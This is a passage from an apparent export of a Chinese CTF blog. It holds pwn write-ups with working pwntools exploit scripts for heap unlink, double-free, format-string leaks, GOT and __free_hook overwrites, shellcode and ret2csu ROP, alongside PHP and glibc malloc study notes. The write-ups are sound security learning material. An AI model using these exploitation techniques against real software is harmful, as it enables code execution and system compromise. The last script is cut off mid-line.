p.sendlineafter('Index :',str(index)) def free(index): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) context.terminal = ['tmux','splitw','-h'] elf = ELF('./bjdctf_2020_YDSneedGrirlfriend') backdoor = 0x400B9C add(0x10,'aaaaaaaa') #chunk0 add(0x20,'aaaaaaaa') #chunk1 free(0) free(1) add(0x10,p64(backdoor)) show(0) #gdb.attach(p) p.interactive() pwnable_orw 题目直接bss可执行，让我们丢shellcode 但是加了个沙箱，只能用orw去读 真不戳真不戳，又从pwnki老师那儿学到了shellcraft的新姿势 exp: from pwn import * local = 1 binary = &quot;./orw&quot; if local == 0: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,26316) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] context(arch = 'i386', os = 'linux') bss = 0x0804A060 + 0x100 shellcode = shellcraft.open('/flag') # /* open(file='flag', oflag=0, mode=0) */ # /* push 'flag\\x00' */ # push 1 # dec byte ptr [esp] # push 0x67616c66 # mov ebx, esp # xor ecx, ecx # xor edx, edx # /* call open() */ # push SYS_open /* 5 */ # pop eax # int 0x80 #shellcode += shellcraft.read('eax',bss,0x100) shellcode += shellcraft.read('eax','esp',0x100) # /* read(fd='eax', buf='esp', nbytes=256) */ # mov ebx, eax # mov ecx, esp # xor edx, edx # mov dh, 0x100 &gt;&gt; 8 # /* call read() */ # push SYS_read /* 3 */ # pop eax # int 0x80 #shellcode += shellcraft.write(1,bss,0x100) shellcode += shellcraft.write(1,'esp',0x100) # /* write(fd=1, buf='esp', n=256) */ # push 1 # pop ebx # mov ecx, esp # xor edx, edx # mov dh, 0x100 &gt;&gt; 8 # /* call write() */ # push SYS_write /* 4 */ # pop eax # int 0x80 shellcode = asm(shellcode) p.sendafter('Give my your shellcode:',shellcode) p.interactive() wustctf2020_name_your_cat 跟dog那个差不多，不过这次传入的是栈的地址，很自然想到改写ret的地址 但是一开始以为是修改array+0x38处的地址，但是后来才意识到函数调用，栈桢迁移了一下，所以动态调试一下 有后门，一把梭 exp from pwn import * local = 0 binary = &quot;./wustctf2020_name_your_cat&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,26919) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] def add(index,content): p.sendlineafter('&gt;',str(index)) p.sendlineafter('Give your name plz: ',content) dbg() backdoor = 0x080485D4 add(-5,p32(backdoor)) #gdb.attach(p) p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn2/"},{"title":"axb_2019_heap","content":"发现一个很有意思的题目，学到了一些东西，特此记录一下 逆向 main函数： 在format_string里面有格式化字符串漏洞 add函数： 很长，大体意思就是bss段上有一个key，如果key == 43，就可以申请fastbin大小的chunk，否则不可以 get_input里面存在off-by-one漏洞，别的函数就不看了，节省时间 思路 这个题目在bss上是有heaparray的，但是保护全开，有个format string漏洞 思路就出来了，我们可以利用格式化字符串泄漏相关地址，然后实施unlink攻击 我们调试一下，直接定位到printf的位置单步调试 注意，调试格式化字符串漏洞的时候一定要进入到输入点之前才能确定栈上的位置 tips：在pwndbg里面我们可以利用命令fmtarg来确定是格式化字符串的第几个参数 fmtarg 0x7ffdb76453e8 main+28的地方发现是第十一个参数，__libc_start_main+20的地方发现是第十五个参数 但是注意，我们在打格式化的时候，%11p只是取栈的地址，要想取栈地址里面存的值要用$p 利用main+28可以泄漏出heaparray的地址，具体做法如下 .text:000000000000116A .text:000000000000116A ; int __cdecl main(int argc, const char **argv, const char **envp) .text:000000000000116A public main .text:000000000000116A main proc near ; DATA XREF: _start+1D↑o .text:000000000000116A 可以看到在开启pie的情况下main的相对加载位置在0x116A处 .bss:0000000000202060 public note .bss:0000000000202060 note db ? ; ; DATA XREF: add_note+DA↑o .bss:0000000000202060 ; add_note+F4↑o ... heaparray位于0x202060处，所以heaparray在被加载进内存的地址就等于(main+28)-28-0x116A+0x202060的地址 利用__libc_start_main来泄漏libc的地址 思路就是申请三个chunk，然后利用off-by-one溢出一个字节unlink到heaparray，然后改写__free_hook为system 为什么不改写__malloc_hook呢？？因为程序内部存在检查，如果改写malloc相关的函数会报出&quot;no hacker&quot;之类的字符串 为什么不改写free呢？？因为调试发现会crash掉 tips：unlink的时候注意 chunk0 chunk1 chunk2 我们通常是先构造fakechunk，然后free(1)，但是我们伪造的fd和bk注意是heaparray[0] - 0x18和0x10的位置 本地能打通，远程一直报timeout的错误，用别人的脚本也这样，愁人 exp from pwn import * local = 0 if local == 1: p = process('./axb_2019_heap') else: p = remote('node3.buuoj.cn',28566) elf = ELF('./axb_2019_heap') libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' def fmt(name): p.recvuntil('Enter your name:') p.sendline(name) def add(index,size,content): p.sendlineafter('&gt;&gt; ','1') p.sendlineafter('Enter the index you want to create (0-10):',str(index)) p.sendlineafter('Enter a size:',str(size)) p.sendlineafter('Enter the content:',content) def free(index): p.sendlineafter('&gt;&gt; ','2') p.sendlineafter('Enter an index:',str(index)) def edit(index,content): p.sendlineafter('&gt;&gt; ','4') p.sendlineafter('Enter an index:',str(index)) p.sendafter('Enter the content:',content) #dbg() print(&quot;======= step 1 : by use fmtstr leak address libc + bss =======&quot;) fmt('%11$p%15$p') p.recvuntil('Hello,') main = int(p.recv(15),16) - 28 __libc_start_main = int(p.recv(15),16) - 240 print(&quot;main ---&gt; &quot; + hex(main)) print(&quot;__libc_start_main ----&gt; &quot; + hex(__libc_start_main)) heaparray = main - 0x116A + 0x202060 print(&quot;heaparray in bss(DATA) ----&gt; &quot; + hex(heaparray)) libc_base = __libc_start_main - libc.sym['__libc_start_main'] print(&quot;libc base ----&gt;&quot; + hex(libc_base)) add(0,0x98,'A') #chunk0 add(1,0xa0,'B') #chunk1 add(2,0x90,'/bin/sh\\x00') #chunk2 print(&quot;======== step 2: unlink =========&quot;) fd = heaparray - 0x18 bk = heaparray - 0x10 chunk0 = p64(0) + p64(0x91) + p64(fd) + p64(bk) +p64(0) * 14 + p64(0x90) + p64(0xb0) edit(0,chunk0) free(1) print(&quot;======= step 3: attack __free_hook ======&quot;) free = libc_base + libc.symbols['__free_hook'] system = libc_base + libc.symbols['system'] payload = p64(0) * 3 + p64(free) + p64(0x8) + b'\\n' print(&quot;这里写入8是因为我们要在bss上伪造chunksize，我们需要写入8字节的payload，即下文的p64(system)&quot;) edit(0,payload) payload = p64(system) print(hex(system)) #dbg() edit(0,payload) p.sendline('2') p.sendline('2') p.interactive() ","link":"https://l3mon629.github.io/post/axb_2019_heap/"},{"title":"PHP面向对象学习","content":"面向对象基础 面向对象的关键字说明 面向对象关键字：基于面向对象开发时，所用到的一些关键字，用来表明一些结构和类型 类：定义面向对象主体的最外层结构，包裹主体的数据和功能，共性事物的代表 对象：是某类事物的具体代表，是实际数据和功能操作的具体单元，也被称之为实例 实例化：new，从一个抽象的概念得到符合抽象概念的具体实例的过程 类成员：member，指类class中的所有内容，类成员有三种 属性：在class中创建的变量 方法：class结构中创建的函数 类常量：const，在class中创建的常量 面向对象简单技术实现 class 声名 类 类名：驼峰命名 大括号：只有在大括号里面的东西才是类成员，大括号里面的大括号不算 class name{ } 实例化：产生对象 new 类名; new 类名(); #较多 对象：一般用变量保存 $object = new classname(); 步骤：1，根据需求产生类的结构 2，需要使用时实例化 demo &lt;?php class Nothing{ } $nothing = new Nothing(); var_dump($nothing); 运行结果 类成员 属性和方法需要使用访问修饰限定修饰符，暂时使用public 成员访问：属性和方法都属于对象访问，类常量属于类访问 对象访问属性和方法，使用-&gt; 自己简单写个例子好了 &lt;?php class Student{ const STUDENT_NUMBER = 27; public $name; public $number; public $sex; public function print(){ echo __CLASS__; #魔术方法，打印类名 } } 成员访问方法：必须通过对象访问 属性访问：增删改查 &lt;?php class Student{ const STUDENT_NUMBER = 27; public $name; public $number; public $sex; public function print(){ echo &quot;\\n&quot;.__CLASS__; #魔术方法，打印类名 } } $stu = new Student(); #增 $stu -&gt; tall; $stu -&gt; height = 180; #删除 unset($stu -&gt; number); #改 $stu -&gt; name = &quot;Tom&quot;; #查 var_dump($stu -&gt; name); echo &quot;\\n&quot;; var_dump($stu); 运行情况 访问方法 $stu -&gt; print(); 打印出来类的名字 通常，我们访问属性，只用改和查就够了 访问修饰限定符 概念 访问修饰限定符：用在属性或者方法前修饰的关键字，是用来控制属性或者方法的访问位置 分类 public，公有，类内类外都可 protected，受保护，只允许在相关类内部访问 private，私有，只允许在定义类内部访问 方法可以没有没有修饰限定符，默认public 类内部对象 概念 $this 方法内部内置的一个对象，会自动指向来调用方法的对象 步骤 1，声明类结构 2，明确私有成员，不限定成员的访问限定修饰符 3，私有成员需要在某种情况下被访问：增加方法，在方法里使用$this访问 直接看代码好了 &lt;?php class Saler{ public $count = 100; public function getV(){ echo $count; //会报错，提示未定义变量 } } $s = new Saler(); $s -&gt; getV(); &lt;?php class Saler{ public $count = 100; public function getV(){ var_dump($this); echo &quot;&lt;br&gt;&quot; . $this -&gt; count; } } $s = new Saler(); $s -&gt; getV(); 运行结果 注意，$this对象是在类内部访问的，因此可以访问类的所有的属性和方法，不受访问修饰限定符的限制 thisclass和new的关系原理class:定义类结构，属于非执行段代码，因此会被加载到代码段（编译）new:实例化对象，先判定类在内存里是否存在。不存在报错。若存在，则将类内部的属性复制一份，然后在内存（heap）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间对象访问属性即访问的是对象空间里存储的部分，对象访问方法是通过内部指针找到类空间中的方法，然后再内存（栈）开辟运行this class和new的关系原理 class:定义类结构，属于非执行段代码，因此会被加载到代码段（编译） new:实例化对象，先判定类在内存里是否存在。不存在报错。若存在，则将类内部的属性复制一份，然后在内存（heap）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间 对象访问属性即访问的是对象空间里存储的部分，对象访问方法是通过内部指针找到类空间中的方法，然后再内存（栈）开辟运行 thisclass和new的关系原理class:定义类结构，属于非执行段代码，因此会被加载到代码段（编译）new:实例化对象，先判定类在内存里是否存在。不存在报错。若存在，则将类内部的属性复制一份，然后在内存（heap）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间对象访问属性即访问的是对象空间里存储的部分，对象访问方法是通过内部指针找到类空间中的方法，然后再内存（栈）开辟运行this:是系统在方法内置的对象通用名字，对象在调用方法的时候，系统会自动找到对象所保存的内存地址（heap）然后把地址赋给this 本质：局部变量 ","link":"https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/"},{"title":"glibc源码学习","content":"主要探究一下malloc和free是如何执行的 !!!说明：本文是杂文，可能只有我能看懂，仅供复习参考使用，不定期更新 malloc 真正发挥作用的是_int_malloc 但是call malloc是__libc_malloc 在__libc_malloc中会调用_int_malloc 整个heap的信息都记录在struct malloc_state中，称为main_arena __libc_malloc主体部分如下 hook取得__malloc_hook部分内容 如果指针hook != 0 就调用hook函数 (第一次调用malloc时，__malloc_hook里面其实是有一个叫malloc_hook_ini的函数，该函数首先把__mallochook置0防止再次调用（因为返回地址是__libc_malloc，然后调用了ptmalloc_init()这个做初始化工作的主体函数) void * __libc_malloc (size_t bytes) { mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim; } 点进去arena_get /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */ #define arena_get(ptr, size) do { \\ ptr = thread_arena; \\ arena_lock (ptr, size); \\ } while (0) 我们直接上手跟踪好了 #Include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { void *p,*q; p = malloc(100); q = malloc(16); return 0; } 可以看到，第一次调用malloc时，会进去malloc_hook_ini函数 执行完后返回到__libc_malloc函数里面 free 我们通过这个demo看一下free过程中发生了啥 #include &lt;stdio.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r; p = malloc(150); q = malloc(150); r = malloc(150); free(p); free(r); free(q); } 如图，我们现在申请了三个chunk free掉一块，可以看到进入unsorted bin中去 把r free掉，可以看到直接和top chunk合并了 思考：如果free q后，是q先和p合并呢还是先和topchunk合并呢？？ 调试小技巧 可以看到，其实是先和前一块chunk进行合并的 size加上prevsize之类的 小技巧，p *(struct malloc_state*)address可以将某个地址的堆块详细信息打印出来 可以看到，最终三个chunk都被top chunk合并起来 ","link":"https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/"},{"title":"ctfwiki-unlink—2014 HITCON stkof","content":"通过这个题目再来学习下unlink 逆向 main函数，一样是个菜单题，但是比较坑的是没给菜单，只能靠用户来逆向出其功能 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int index; // eax signed int v5; // [rsp+Ch] [rbp-74h] char nptr; // [rsp+10h] [rbp-70h] unsigned __int64 v7; // [rsp+78h] [rbp-8h] v7 = __readfsqword(0x28u); alarm(0x78u); while ( fgets(&amp;nptr, 10, stdin) ) { index = atoi(&amp;nptr); if ( index == 2 ) { v5 = sub_4009E8(); goto LABEL_14; } if ( index &gt; 2 ) { if ( index == 3 ) { v5 = sub_400B07(); goto LABEL_14; } if ( index == 4 ) { v5 = sub_400BA9(); goto LABEL_14; } } else if ( index == 1 ) { v5 = sub_400936(); goto LABEL_14; } v5 = -1; LABEL_14: if ( v5 ) puts(&quot;FAIL&quot;); else puts(&quot;OK&quot;); fflush(stdout); } return 0LL; } add堆块功能： 其中heaparray在0x602140处 signed __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *mem_ptr; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); mem_ptr = (char *)malloc(size); if ( !mem_ptr ) return 0xFFFFFFFFLL; ::s[++dword_602100] = mem_ptr; printf(&quot;%d\\n&quot;, (unsigned int)dword_602100, size); return 0LL; } free： no UAF signed __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; return 0LL; } edit:可以任意修改堆块size，造成任意堆溢出 signed __int64 sub_4009E8() { signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } IO 缓冲区问题分析 值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看 初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。 别管我说的啥，调试就完了 exp 思路：利用unlink修改heaparray[0][1][2]，看exp吧 from pwn import * p = process('./stkof') elf = ELF('./stkof') libc = ELF('./libc.so.6') def add(size): p.sendline('1') p.sendline(str(size)) def edit(index,size,content): p.sendline('2') p.sendline(str(index)) p.sendline(str(size)) p.send(content) def delete(index): p.sendline('3') p.sendline(str(index)) add(0x10) #chunk1：对抗缓冲区 add(0x30) #chunk2 add(0x80) #chunk3 add(0x10) #chunk4 ptr = 0x602140 fd = ptr + 0x10 - 0x18 bk = ptr + 0x10 - 0x10 fake_chunk = p64(0) fake_chunk += p64(0x31) fake_chunk += p64(fd) fake_chunk += p64(bk) fake_chunk += p64(0) * 2 fake_chunk += p64(0x30) fake_chunk += p64(0x90) edit(2,len(fake_chunk),fake_chunk) delete(3) print(&quot;现在修改heaparray[0][1][2] 分别为free，puts和atoi&quot;) payload = p64(0) payload += p64(elf.got['free']) payload += p64(elf.got['puts']) payload += p64(elf.got['atoi']) edit(2,len(payload),payload) print(&quot;现在修改free的值为puts，然后free(1),就是puts(1)，即输出puts的真实地址&quot;) payload = p64(elf.plt['puts']) edit(0,8,payload) delete(1) #context.log_level = 'debug' puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8,b'\\x00')) print(&quot;puts addr ----&gt; &quot; + hex(puts_addr)) print(&quot;经过调试算出来相对差值为0x67860,不知道为什么最近libc老不准&quot;) libc_base = puts_addr - 0x67860 print(&quot;libc ---&gt; &quot; + hex(libc_base)) system_addr = libc_base + 0x3f550 paylaod = p64(system_addr) edit(2,8,paylaod) p.sendline(&quot;sh&quot;) p.interactive() ","link":"https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"},{"title":"unlink利用—hitcontraining_unlink","content":"unlink 简单说一下吧，不说太多了，比较累了 总结一下 (只讨论2.23版本的libc下的unlink) 利用条件 一个指向heap的指针，在bss段上之类的，最好没开pie，就比较轻松点儿 然后还需要堆溢出或者UAF，目的都是改写smallbin 或是 unsorted bin 的 fd 和 bk 指针 效果 使得已指向chunk 的指针 ptr 变为 ptr - 0x18 通用思路 设指向可 UAF chunk 的指针的地址为 ptr 修改 fd 为 ptr - 0x18 修改 bk 为 ptr - 0x10 触发 unlink 更详细的思路： 以能够进行堆溢出的场景下说明： 1，申请三个堆块012，0用来溢出，1用来作为unsorted bin，2用来保护 2，伪造chunk0，伪造fd和bk之类的，然后利用堆溢出来改写chunk1的prevsize和size的inuse 3，free1，触发unlink 4，找bss段上的全局指针，看看周围怎么利用，比如改got表 解题 逆向 不看了，简单逆向，漏洞位于在edit中，可以任意修改长度，老漏洞了 思路，伪造chunk，然后unlink到bss处，改写heaparray到free@got，然后修改为system 下图为atoi，一开始是修改atoi为system，然后输入sh拿到shell，本地可以打通，但是远程就不行了，qswl 还有libcsearcher，我的libcsearcher像坨屎一样误差就nima离谱，草 exp from pwn import * from LibcSearcher import * #r=process('bamboobox') #r=remote('node3.buuoj.cn',28011) elf=ELF('../hitcontraining_unlink/bamboobox') r = process('../hitcontraining_unlink/bamboobox') def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context) def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context) def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) alloc(0x30,'bbbb') alloc(0x30,'bbbb') alloc(0x80,'cccc') alloc(0x20,'/bin/sh\\x00') glo=0x6020c8+0x10 fd=glo-0x18 bk=glo-0x10 payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90) edit(1,len(payload),payload) free(2) free_got=elf.got['free'] log.info(&quot;free_got:%x&quot;,free_got) payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got) #print payload1 edit(1,len(payload),payload1) show() #log.info(&quot;got:%s&quot;,r.recv()) free_addr=u64(r.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, b'\\x00')) log.info(&quot;free_addr:%x&quot;,free_addr) libc=LibcSearcher('free',free_addr) libc_base=free_addr-libc.dump('free') log.info(&quot;libc_addr:%x&quot;,libc_base) system_addr=libc_base+libc.dump('system') log.info(&quot;system_addr:%x&quot;,system_addr) edit(1,0x8,p64(system_addr)) pause() free(3) r.interactive() 被环境恶心死了，本地的cccc ","link":"https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"},{"title":"gyctf_2020_some_thing_exceting","content":"第一次尝试了边做题边写wp，感觉还挺好，因为这样可以使自己思路更开阔，很不错 这个题自己没做出来 原因：ptmalloc管理机制还是不熟悉，没有想起来double free的利用条件（脑子抽了，不知道当时想的什么 逆向和解题中的思路 main函数 r_start函数 可以发现这个函数要求在根目录下有一个flag文件，要不然就exit了，所以本地做题的时候要创建一下 然后还可以发现这个bss段中有个变量貌似很可疑，后期关注下，看看能不能伪造chunk啥的 add函数 这个程序没有edit功能 delete 初步分析是有UAF洞 show 我们直接新建两个堆块，看一下内存分布是什么样子的 from pwn import * local = 1 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x20,'AAAAAAAA',0x30,'BBBBBBBB') add(0x10,'aaaaaaaa',0x50,'bbbbbbbb') pause() 看一下chunk分布 可以初步判定，绿色框框框起来的chunk是管理后面两个ba和na的chunk 但是前面两个非常大的chunk暂时就不知道是用来做什么的了 分布很清晰 刚刚发现，flag被存到了bss的一个数组里面，见r_start函数 而且bss段的分布很有意思 heap[] byte_6020A0 (96) s[] (flag) 这个结构后续肯定可以利用 可以看到，free后的数据区域已经被清空 我现在的思路是既然程序本身好像没有漏洞，那么肯定不能向拿shell的思路去进行了 那我们不妨就考虑信息泄漏这个途径，我们可不可以利用double free呢？尝试改写fd指针到byte_6020A0的位置处，然后show打印内容，因为bss段那样的内存分布，一个可以泄漏出flag，本地调试一下 实验一下发现不可取，因为free后将内容清空了 那么还有一个思路是因为我们有堆管理指针，那么我们可不可以改写指针到bss段呢？再度尝试一下 这种思路也失败了，因为发现无法进行溢出，连空字节都无法溢出 思路三：或许之前大chunk里面有可以利用的点，我们不妨看看 好吧，并没有发现什么玄机，我准备看wp了:( 开幕雷击，发现wp利用的是double free，但是在第一个思路里我失败了，本地double free会报错？ oh no 我傻了，double free的利用条件是前后free的两个chunksize要相同，这样在bin里面才会连接起来，cao，我是sb 这样岂不是简单很多了？？淦，本来可以自己出的，算了，反正没看exp，自己写exp好了 可以看到已经形成闭环了，至于为啥选0x60，是因为bss段上那个数值是96 已经伪造成功了 exp from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x30,'AAAAAAAA',0x50,'BBBBBBBB') #chunk0 add(0x30,'aaaaaaaa',0x50,'bbbbbbbb') #chunk1 delete('0') delete('1') delete('0') bss_6020A0 = 0x6020A0 - 0x8 add(0x50,p64(bss_6020A0),0x50,'A') #chunk2 add(0x50,'B',0x50,'C') #chunk3 show('3') print(p.recv()) p.interactive() ","link":"https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/"},{"title":"ret2csu—缩短payload","content":"起因是这样的，跟一个pwn师傅聊天的时候，他发给我了一道题，说很有意思，我就打开来看了看 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;welcome~\\n&quot;, 9uLL); vul(); return 0; } vul函数 ssize_t vul() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x100uLL); } 就这？ 我他妈直接ret2csu 先写一下原理吧，到时候复习比较方便 ret2csu __libc_csu_init 重点关注这个函数 为啥呢，因为它里面有很好的gadget 我们知道在64位环境下，前六个参数是由寄存器来传递的，分别是rdi rsi rdx rcx r8 r9 那我们看这两个片段 第一个是pop片段 .text:000000000040060A pop rbx .text:000000000040060B pop rbp .text:000000000040060C pop r12 .text:000000000040060E pop r13 .text:0000000000400610 pop r14 .text:0000000000400612 pop r15 .text:0000000000400614 retn 这一串pop和retn分别打到了寄存器上然后还能retn，但是我们需要的是那六个寄存器，但是看前一个片段 .text:00000000004005F0 mov rdx, r13 .text:00000000004005F3 mov rsi, r14 .text:00000000004005F6 mov edi, r15d .text:00000000004005F9 call qword ptr [r12+rbx*8] 我们可以利用这个来调整寄存器这样edi，rsi，rdx前三个寄存器便可以由我们来控制了 利用 我们看ctfwiki 然后wiki给了一个几乎万能的exp from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF('./level5') sh = process('./level5') write_got = level5.got['write'] read_got = level5.got['read'] main_addr = level5.symbols['main'] bss_base = level5.bss() csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1) sh.recvuntil('Hello, World\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(sh.recv(8)) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') execve_addr = libc_base + libc.dump('execve') log.success('execve_addr ' + hex(execve_addr)) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh.recvuntil('Hello, World\\n') csu(0, 1, read_got, 16, bss_base, 0, main_addr) sh.send(p64(execve_addr) + '/bin/sh\\x00') sh.recvuntil('Hello, World\\n') ## execve(bss_base+8) csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) sh.interactive() 这个来泄漏libc是通过write函数，难度上来说比puts要更难了 思路就是先泄漏libc，然后劫持read函数，向bss段上写入/bin/sh，和system之类的系统函数，然后劫持程序流到bss段拿shell 解题 那我们直接照抄exp就好了，反正大同小异（打脸 from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060A def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' payload = b'a' * 0x88 payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.recvuntil('~\\n') p.send(payload) p.send(p64(execve)) p.send('/bin/sh\\0') sleep(1) #p.send(p64(execve) + 